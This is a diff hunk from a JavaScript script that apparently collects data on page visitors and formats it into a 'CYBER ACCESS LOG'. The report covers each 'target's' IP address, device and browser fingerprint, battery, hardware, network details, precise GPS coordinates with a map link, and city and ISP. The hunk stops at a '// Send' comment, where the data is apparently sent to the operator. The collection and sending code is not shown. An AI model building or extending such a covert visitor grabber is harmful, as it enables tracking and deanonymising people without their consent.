@@ -166,72 +166,83 @@ data.Engine = engine;
   data.Timestamp = new Date().toLocaleString();
 
   // 🎨 FORMATTED OUTPUT
-  const formatted = `
-🚨 NEW VISITOR DETECTED 🚨
+const formatted = `
+┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
+             🖥️ CYBER ACCESS LOG 🖥️
+┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
 
-╔═════════════════════════╗
-   SYSTEM INFORMATION REPORT
-╠═════════════════════════╣
+🕶 TARGET IDENTITY
+════════════════════
+🌐 IP        ➤ ${data.IP_Address}
+📶 STATUS    ➤ ${data.Online_Status}
+🗣 LANG      ➤ ${data.Language}
 
-🌐 NETWORK IDENTITY
-   ├─ IP Address : ${data.IP_Address}
-   ├─ Status     : ${data.Online_Status}
-   └─ Language   : ${data.Language}
+📱 DEVICE SCAN
+════════════════════
+📲 MODEL     ➤ ${data.Device_Model}
+⚙️ PLATFORM  ➤ ${data.Platform}
+🍪 COOKIES   ➤ ${data.Cookies_Enabled}
+🧾 AGENT     ➤ ${data.User_Agent}
 
-📱 DEVICE INFORMATION
-   ├─ Model      : ${data.Device_Model}
-   ├─ Platform   : ${data.Platform}
-   ├─ Cookies    : ${data.Cookies_Enabled}
-   └─ UserAgent  : ${data.User_Agent}
+🖥 DISPLAY MATRIX
+════════════════════
+📺 SCREEN    ➤ ${data.Screen_Resolution}
+🎨 COLORS    ➤ ${data.Color_Depth}
+🌍 ZONE      ➤ ${data.Timezone}
 
-🖥️ DISPLAY INFORMATION
-   ├─ Resolution : ${data.Screen_Resolution}
-   ├─ ColorDepth : ${data.Color_Depth}
-   └─ Timezone   : ${data.Timezone}
+🔋 POWER CORE
+════════════════════
+🔋 BATTERY   ➤ ${data.Battery?.Level || "N/A"}
+⚡ CHARGING  ➤ ${data.Battery?.Charging || "N/A"}
 
-🔋 BATTERY STATUS
-   ├─ Level      : ${data.Battery?.Level || "N/A"}
-   └─ Charging   : ${data.Battery?.Charging || "N/A"}
+⚙️ HARDWARE NODE
+════════════════════
+🧠 CPU       ➤ ${data.Hardware?.CPU_Cores || "N/A"} Cores
+💾 RAM       ➤ ${data.Hardware?.Device_Memory_GB || "N/A"} GB
 
-⚙️ HARDWARE
-   ├─ CPU Cores  : ${data.Hardware.CPU_Cores}
-   └─ RAM        : ${data.Hardware.Device_Memory_GB} GB
+💽 STORAGE TRACE
+════════════════════
+📂 USED      ➤ ${data.Storage?.Usage_MB || "N/A"}
+📦 TOTAL     ➤ ${data.Storage?.Quota_MB || "N/A"}
 
-💾 STORAGE
-   ├─ Used       : ${data.Storage?.Usage_MB || "N/A"}
-   └─ Total      : ${data.Storage?.Quota_MB || "N/A"}
+📡 NETWORK SIGNAL
+════════════════════
+📶 TYPE      ➤ ${data.Network?.Type || "N/A"}
+🚀 SPEED     ➤ ${data.Network?.Downlink || "N/A"}
+📡 RTT       ➤ ${data.Network?.RTT || "N/A"}
+💡 SAVE DATA ➤ ${data.Network?.Save_Data || "N/A"}
 
-📡 NETWORK DETAILS
-   ├─ Type       : ${data.Network?.Type || "N/A"}
-   ├─ Speed      : ${data.Network?.Downlink || "N/A"}
-   ├─ RTT        : ${data.Network?.RTT || "N/A"}
-   └─ Save Data  : ${data.Network?.Save_Data || "N/A"}
+📍 GEO TRACKER
+════════════════════
+📌 LAT       ➤ ${data.Location?.Latitude || "N/A"}
+📌 LONG      ➤ ${data.Location?.Longitude || "N/A"}
+🎯 ACCURACY  ➤ ${data.Location?.Accuracy || "N/A"}
+🗺 MAP       ➤ ${data.Location?.Google_Maps || data.Location || "N/A"}
 
-📍 LOCATION
-   ├─ Latitude   : ${data.Location?.Latitude || "N/A"}
-   ├─ Longitude  : ${data.Location?.Longitude || "N/A"}
-   ├─ Accuracy   : ${data.Location?.Accuracy || "N/A"}
-   └─ Maps       : ${data.Location?.Google_Maps || data.Location}
+🌍 GEO DATABASE
+════════════════════
+🌎 COUNTRY   ➤ ${data.Geo?.Country || "N/A"}
+🏙 REGION    ➤ ${data.Geo?.Region || "N/A"}
+🏠 CITY      ➤ ${data.Geo?.City || "N/A"}
+📡 ISP       ➤ ${data.Geo?.ISP || "N/A"}
 
-🕒 SESSION
-   └─ Time       : ${data.Timestamp}
-🌍 GEO LOCATION
-   ├─ Country   : ${data.Geo?.Country || "N/A"}
-   ├─ Region    : ${data.Geo?.Region || "N/A"}
-   ├─ City      : ${data.Geo?.City || "N/A"}
-   └─ ISP       : ${data.Geo?.ISP || "N/A"}
+📲 DEVICE TYPE
+════════════════════
+🛠 ${data.Device_Type || "Unknown"}
 
-📱 DEVICE TYPE
-   └─ ${data.Device_Type || "Unknown"}
+🌐 BROWSER CORE
+════════════════════
+🧠 BROWSER   ➤ ${data.Browser || "Unknown"}
+⚙️ ENGINE    ➤ ${data.Engine || "Unknown"}
 
-🌐 BROWSER INFO
-   ├─ Browser   : ${data.Browser || "Unknown"}
-   └─ Engine    : ${data.Engine || "Unknown"}
+⏳ SESSION TRACE
+════════════════════
+🕒 TIME      ➤ ${data.Timestamp}
+⌛ DURATION  ➤ ${data.Session_Duration || "0 sec"}
 
-⏳ SESSION
-   └─ Duration  : ${data.Session_Duration || "0 sec"}
-
-╚═════════════════════════╝
+┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
+            ⚡ POWERED BY PRINCE ⚡
+┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
 `;
 
   // 🚀 Send
